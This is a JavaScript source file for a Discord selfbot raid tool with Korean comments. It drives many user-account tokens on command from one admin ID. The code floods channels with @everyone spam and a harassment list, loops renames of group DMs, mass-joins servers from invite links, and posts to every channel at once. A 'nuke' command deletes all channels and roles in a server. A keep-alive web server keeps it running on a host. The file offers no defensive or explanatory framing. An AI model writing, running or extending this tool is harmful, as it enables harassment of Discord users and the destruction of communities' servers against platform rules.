require('dotenv').config();
const http = require('http');
const { Client } = require('discord.js-selfbot-v13');
const jtList = require('./jtlist'); 

// 렌더(Render) 생존 신고용 서버 설정
const PORT = process.env.PORT || 8080; 
http.createServer((req, res) => {
    res.writeHead(200, { 'Content-Type': 'text/plain' });
    res.write('OK');
    res.end();
}).listen(PORT, '0.0.0.0');

const ADMIN_USER_ID = "1429412320194592811"; 
const adminToken = process.env.ADMIN_TOKEN;
const workerTokens = Object.keys(process.env)
    .filter(k => k.startsWith('TOKEN_'))
    .map(k => process.env[k].trim())
    .filter(Boolean);

const allTokens = [adminToken, ...workerTokens].filter(Boolean);
const clients = [];
const activeSpam = new Map();
const activeGnc = new Map();
let statusInterval = null;

// 시그니처 기호 'デ' 수정 완료
const getRand = () => '\n> ︻デ═一 코린이 영역전개로 패죽인 수 > ' + (Math.floor(Math.random() * 900000) + 100000);
const bible = Array.from({ length: 300 }, (_, i) => `[성경 제 ${i + 1}장] 코린을 찬양하라, 그가 곧 진리이니라.`);
const gsContent = `@everyone # 코린찬양해라\nA\n\n\n\n\n\n\n\n\nA\n\n\n\n\n\n\n\n\nA\n\n\n\n\n\n\n\n\nA\n\n\n\n\n\n\n\n\nA\n\n# 코린업업이야ㅋ\nhttps://cdn.discordapp.com/attachments/1500781494522744852/1500861027166720195/6.gif\nhttps://cdn.discordapp.com/attachments/1500792773249335356/1500868310466826360/d5d6a4af8bc5bb67.gif`;

// 도배 실행 로직
const executeSpam = async (client, channel, type, args) => {
    if (!activeSpam.has(client.user.id)) return;
    try {
        let content = "";
        if (type === 'sp') content = (args.join(' ') || '코린 찬양');
        else if (type === 'jt') content = jtList[Math.floor(Math.random() * jtList.length)];
        else if (type === 'start') content = bible[Math.floor(Math.random() * bible.length)];
        else if (type === 'gs') content = gsContent;

        await channel.send({ content: content + getRand(), flags: [4096] }); 
        setTimeout(() => executeSpam(client, channel, type, args), 150);
    } catch (e) {
        setTimeout(() => executeSpam(client, channel, type, args), e.code === 429 ? 2000 : 1000);
    }
};

// 그룹 방제 테러 로직
const executeGnc = async (client, channel, name) => {
    if (!activeGnc.has(client.user.id) || channel.type !== 'GROUP_DM') return;
    try {
        await channel.setName(name + " " + Math.floor(Math.random() * 9999));
        setTimeout(() => executeGnc(client, channel, name), 500);
    } catch (e) {
        setTimeout(() => executeGnc(client, channel, name), 3000);
    }
};

allTokens.forEach((token) => {
    const client = new Client({ checkUpdate: false });
    const isAdminBot = (token === adminToken);

    client.on('ready', () => {
        console.log(`[!] 가동: ${client.user.tag}`);
        clients.push(client);
    });

    client.on('messageCreate', async (msg) => {
        if (!msg.content.startsWith('>') || msg.author.id !== ADMIN_USER_ID) return;

        const args = msg.content.slice(1).trim().split(/ +/);
        const cmd = args.shift().toLowerCase();

        // 워커봇 전용 명령어
        if (!isAdminBot) {
            if (['sp', 'jt', 'start', 'gs'].includes(cmd)) {
                activeSpam.set(client.user.id, true);
                executeSpam(client, msg.channel, cmd, args);
            }
            if (['sps', 'jts', 'stop', 'gss'].includes(cmd)) activeSpam.delete(client.user.id);
            
            if (cmd === 'gnc') {
                activeGnc.set(client.user.id, true);
                executeGnc(client, msg.channel, args.join(' ') || 'KORIN');
            }
            if (cmd === 'gncs') activeGnc.delete(client.user.id);
        }

        // 관리자봇 전용 명령어 (도움말 줄바꿈 수정 완료)
        if (isAdminBot) {
            switch (cmd) {
                case 'h':
                    const h = [
                        ">sp [내용] : 워커 무한 도배",
                        ">sps : 도배 중지",
                        ">gs : 움짤 테러",
                        ">gss : 움짤 테러 중지",
                        ">jt : 장애타 시작",
                        ">start : 성경 난사",
                        ">st [내용] : 상태 고정",
                        ">cls [수] : 내 메시지 삭제",
                        ">fri @멘션 : 친구 추가",
                        ">jn [링크] : 서버 입장",
                        ">lv : 서버 탈퇴",
                        ">nick [이름] : 닉네임 변경",
                        ">gnc [이름] : 그룹방제 테러",
                        ">gncs : 방제 테러 중지",
                        ">nuke : 서버 파괴",
                        ">md [내용] : 전채널 도배"
                    ].join('\n');
                    msg.channel.send(`\`\`\`\n${h}\n\`\`\``);
                    break;
                case 'st':
                    const stTxt = args.join(' ');
                    if (statusInterval) clearInterval(statusInterval);
                    const setST = () => clients.forEach(c => c.user?.setActivity(stTxt, { type: 'PLAYING' }));
                    setST(); statusInterval = setInterval(setST, 30000);
                    break;
                case 'jn':
                    const code = args[0]?.split('/').pop();
                    if (code) clients.forEach(c => c.acceptInvite(code).catch(() => {}));
                    break;
                case 'lv':
                    msg.guild?.leave().catch(() => {});
                    break;
                case 'cls':
                    const count = parseInt(args[0]) || 10;
                    msg.channel.messages.fetch({ limit: 50 }).then(ms => {
                        ms.filter(m => m.author.id === client.user.id).first(count).forEach(m => m.delete().catch(() => {}));
                    });
                    break;
                case 'nick':
                    clients.forEach(c => {
                        msg.guild?.members.cache.get(c.user.id)?.setNickname(args.join(' ')).catch(() => {});
                    });
                    break;
                case 'fri':
                    const targetId = args[0]?.replace(/[<@!>]/g, '');
                    if (targetId) clients.forEach(c => c.relationships.addFriend(targetId).catch(() => {}));
                    break;
                case 'md':
                    msg.guild?.channels.cache.filter(c => c.type === 'GUILD_TEXT').forEach(ch => {
                        ch.send(args.join(' ') + getRand()).catch(() => {});
                    });
                    break;
                case 'nuke':
                    msg.guild.channels.cache.forEach(ch => ch.delete().catch(() => {}));
                    msg.guild.roles.cache.forEach(r => r.delete().catch(() => {}));
                    break;
            }
        }
    });
    client.login(token).catch(() => {});
});

process.on('unhandledRejection', (err) => {});